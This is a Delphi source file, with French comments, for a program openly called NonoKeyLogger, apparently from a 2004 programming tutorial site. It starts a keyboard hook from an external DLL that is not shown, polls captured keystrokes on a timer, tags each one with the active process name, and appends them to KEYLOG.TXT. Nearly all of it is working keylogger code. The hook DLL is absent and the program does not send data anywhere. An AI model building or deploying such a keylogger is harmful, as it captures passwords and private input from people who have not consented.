unit Unit1;
//
// Sujet : Programme de capture des touches : NonoKeyLogger
//
// Par Nono40 : http://nono40.developpez.com   http://nono40.fr.st
//              mailTo:nono40@fr.st
//
// Le 18/08/2004
//
// Je ne garantie absolument pas que ce programme fonctionne et ne suis pas
// responsable de l'utilisation que vous en ferez !
//

// La structure du fichier généré est la suivante :
// S000TTTT=PROCESS.EXE
//   S     :0 quand la touche est appuyée
//          8 quand la touche est lachée
//   TTTT  :Code virtuel de la touche, voir aide de delphi pour avoir la liste des codes
//   PROCESS.EXE :  non de l'exécutable actif au moment de l'appui/laché de la touche
//
// Par exemple si dans Internet Explorer vous appuyer et lacher les touches ABCD vous abtenez :
// 00000041=IEXPLORE.EXE
// 80000041=IEXPLORE.EXE
// 00000042=IEXPLORE.EXE
// 80000042=IEXPLORE.EXE
// 00000043=IEXPLORE.EXE
// 80000043=IEXPLORE.EXE
// 00000044=IEXPLORE.EXE
// 80000044=IEXPLORE.EXE
// 

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
  private
    { Déclarations privées }
  public
    { Déclarations publiques }
  end;

var
  Form1: TForm1;

// Définition des prototype de fonctions contenues dans la dll
// Voir le source de la dll pour plus de détails
Function StartHook                      :Boolean; stdcall; external 'DllHook.dll';
Function StopHook                       :Boolean; stdcall; external 'DllHook.dll';
Function GetNextKey(Var Key,ID:Integer) :Boolean; stdcall; external 'DllHook.dll';

implementation

{$R *.dfm}

Uses tlHelp32;

// Variable contenant la liste actuelle des process
Var ListeProcess :TStrings;
// Variable contenant le fichier texte en cours d'écriture
    Fichier      :TextFile;

// Procédure de mise à jour de la liste des process
// Elle est appelée chaque fois qu'un IdProcess est inconnu dans la liste actuelle
Procedure MiseAJourListeProcess;
Var h   :Integer;
    me32:TProcessEntry32;
Begin
  ListeProcess.Clear;
  h := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS,0);
  me32.dwSize := sizeof(me32);
  If Process32First(h,me32)
  Then Repeat
    ListeProcess.Add(IntToHex(Me32.th32ProcessID,8)+UpperCase(ExtractFileName(StrPas (Me32.szExeFile))));
  Until Not Process32Next(h,me32);
  CloseHandle(h);
End;

// Cherche le nom du fichier EXE en fonction de l'IdProcess
Function ChercheNomProcess(ProcessId:Cardinal):String;
Var i     :Integer;
    Chaine:String;
Begin
  Result:='';
  Chaine:=IntToHex(ProcessID,8);
  For i:=0 To listeProcess.Count-1 Do If Copy(ListeProcess[i],1,8)=Chaine
  Then Begin
    Result:=Copy(ListeProcess[i],9,Length(ListeProcess[i])-8);
    Break;
  End;
End;

// Le timer permet de tester périodiquement l'état du buffer des touches
procedure TForm1.Timer1Timer(Sender: TObject);
Var ProcessId:Integer;
    Key      :Integer;
    Nom      :String;
begin
  // Tant qu'une touche est présente...
  While GetNextKey(Key,ProcessID) Do
  Begin
    // ... on cherche le nom de l'EXE ...
    Nom:=ChercheNomProcess(ProcessId);
    If Nom=''
    Then Begin
      // ... si par hasard il s'agit d'un nouveau process
      // on met à jour la liste et on cherche de nouveau...
      MiseAJourListeProcess;
      Nom:=ChercheNomProcess(ProcessId);
      If Nom='' Then Nom:='<INCONNU>';
    End;
    // ... enfin on stock la touche dans le fichier.
    WriteLn(Fichier,IntToHex(Key,8)+'='+Nom);
  End;
end;

Initialization
  Application.Title:='Nono40';
  // Ouverture en écriture du fichier texte
  AssignFile(Fichier,'KEYLOG.TXT');
  If FileExists('KEYLOG.TXT') Then Append(Fichier)
                                 Else Rewrite(Fichier);
  // Lancement du hook
  If Not StartHook Then ShowMessage('Erreur de lancement du HOOK');
  ListeProcess:=TStringList.Create;
Finalization
  ListeProcess.Free;
  // Arrêt du Hook
  StopHook;
  // et fermeture du fichier
  CloseFile(Fichier);
end.
